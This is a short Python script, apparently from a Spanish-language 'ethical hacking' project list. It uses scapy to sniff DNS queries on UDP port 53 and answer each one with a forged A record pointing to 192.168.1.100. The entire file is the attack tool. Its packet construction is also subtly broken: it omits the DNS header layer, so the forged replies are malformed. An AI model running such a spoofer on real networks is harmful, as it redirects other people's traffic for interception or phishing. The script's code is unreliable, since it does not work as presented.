'''
PROYECTOS DE HACKING ETICO WITH PYTHON
DNS SPOOFER
'''
# Este proyecto implica crear un DNS Spoofer, que es una herramienta para manipular las respuestas DNS.

# Descripción: Utiliza la librería scapy para interceptar y modificar paquetes DNS.

from scapy.all import *

# Función para spoofear DNS
def dns_spoof(packet):
    if packet.haslayer(DNSQR):
        # Spoofear la respuesta DNS
        spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                         UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                         DNSRR(rrname=packet[DNS].qd.qname, type='A', rdata='192.168.1.100', ttl=123)
        send(spoofed_packet, verbose=0)

# Sniffear paquetes DNS
sniff(filter="udp port 53", store=0, prn=dns_spoof)